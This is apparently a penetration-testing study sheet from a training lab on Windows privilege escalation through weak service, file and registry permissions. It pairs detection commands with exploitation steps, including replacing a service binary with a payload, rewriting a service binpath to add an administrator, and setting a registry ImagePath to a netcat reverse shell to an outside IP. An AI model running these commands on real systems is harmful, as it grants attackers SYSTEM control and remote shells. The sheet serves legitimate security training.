# Weak Permissions — Windows PrivEsc

Windows permissions are complex and easy to misconfigure. Services typically install with SYSTEM privileges, so a service permissions flaw often leads to full system compromise. These issues are common in third-party/open-source/custom software and rarer (but not absent) in major vendor products. Always check for weak permissions — with tools when available, manually when not.

---

## 1. Permissive File System ACLs (Weak Service Binary Permissions)

### Find Vulnerable Service Binaries with SharpUp
```powershell
.\SharpUp.exe audit
# Look for: === Modifiable Service Binaries ===
```
Example finding: `SecurityService.exe` with path `C:\Program Files (x86)\PCProtect\SecurityService.exe`.

### Verify with icacls
```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
Red flags: `BUILTIN\Users:(I)(F)` or `Everyone:(I)(F)` = any unprivileged user has full control.

### Exploit — Replace the Binary
```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

sc start SecurityService
```
Replace the binary with an msfvenom payload (reverse shell or add-local-admin) → start service → SYSTEM-level execution.

---

## 2. Weak Service Permissions (Service Config Writable)

### Find Modifiable Services
```cmd
SharpUp.exe audit
# Look for: === Modifiable Services ===
```

### Verify with AccessChk
```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```
Red flag: `RW NT AUTHORITY\Authenticated Users  SERVICE_ALL_ACCESS` = any logged-in user has full read/write control over the service.

### Exploit — Overwrite Binary Path
```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService
# Will fail with error 1053 — but command executes before failure
net localgroup administrators
# htb-student now listed
```

### Cleanup (important — restore original binpath)
```cmd
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindScribeService
sc query WindScribeService
# STATE: Running
```

> Real-world example: [CVE-2019-1322](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1322) — weak permissions on the Windows Update Orchestrator Service (UsoSvc, running as `NT AUTHORITY\SYSTEM`) allowed service accounts to modify the binary path and escalate to SYSTEM.

---

## 3. Unquoted Service Paths

### How It Works
If a service binary path contains spaces and is **not** wrapped in quotes, Windows will try to execute each space-delimited segment as a potential path:

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
Windows attempts (in order):
```
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
If you can write a file to one of those intermediate paths, it executes instead of the real binary.

**Limitation:** Creating files in `C:\` root or `C:\Program Files\` requires admin rights, making this rarely directly exploitable. Still worth documenting.

### Find Unquoted Service Paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Verify a Specific Service
```cmd
sc qc SystemExplorerHelpService
# Check BINARY_PATH_NAME for unquoted paths with spaces
```

---

## 4. Permissive Registry ACLs

### Find Writable Service Registry Keys
```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```
Red flag: `KEY_ALL_ACCESS` on a service key for a non-admin user.

### Exploit — Overwrite ImagePath
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
On next service start, the malicious binary executes in the service's security context.

---

## 5. Modifiable Registry Autorun Binaries

### Enumerate Startup Programs
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
If you have write access to the registry key or can overwrite the binary it points to → payload executes next time the associated user logs in.

Common autorun locations:
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (all users)
- `HKU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (specific user)

Further reference: [AutoRun locations overview](https://www.ghacks.net/2016/06/04/windows-autorun-locations/)

---

## Key Takeaways
| Misconfiguration | Detection | Exploitation |
|---|---|---|
| Writable service binary | `icacls`, `SharpUp` | Replace binary with payload, start service |
| Writable service config | `accesschk`, `SharpUp` | Overwrite `binpath`, restart service |
| Unquoted service path | `wmic` + `findstr` | Plant binary at intermediate path (often impractical) |
| Writable registry service key | `accesschk` on `HKLM\...\services` | Overwrite `ImagePath` with malicious path |
| Writable autorun binary/registry | `Get-CimInstance Win32_StartupCommand` | Overwrite binary or registry value for next user logon |